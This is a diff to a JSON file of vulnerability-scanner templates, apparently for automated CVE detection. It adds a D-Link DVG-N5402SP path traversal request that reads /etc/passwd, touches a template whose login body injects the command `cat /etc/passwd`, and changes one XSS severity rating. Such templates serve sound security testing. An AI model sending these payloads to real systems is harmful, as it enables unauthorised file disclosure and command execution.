@@ -4158,6 +4158,20 @@
       ]
     },
     {
+      "id": "CVE-2015-7245",
+      "info": {
+        "name": "D-Link DVG-N5402SP - Path Traversal",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /cgibin/webproc HTTP/1.1\nHost: {{Hostname}}\n\ngetpage=html%2Findex.html&*errorpage*=../../../../../../../../../../../etc/passwd&var%3Amenu=setup&var%3Apage=connected&var%&objaction=auth&%3Ausername=blah&%3Apassword=blah&%3Aaction=login&%3Asessionid=abcdefgh\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2015-7297",
       "info": {
         "name": "Joomla! Core SQL Injection",
@@ -11594,8 +11608,8 @@
         {
           "body": "op=login&username=;`cat /etc/passwd`&password=\n",
           "headers": {
-            "Referer": "{{Hostname}}/module/login/login.html",
-            "Content-Type": "application/x-www-form-urlencoded"
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Referer": "{{Hostname}}/module/login/login.html"
           },
           "method": "POST",
           "path": [
@@ -20675,7 +20689,7 @@
       "id": "CVE-2022-31798",
       "info": {
         "name": "Nortek Linear eMerge E3-Series - XSS",
-        "severity": "high"
+        "severity": "medium"
       },
       "requests": [
         {
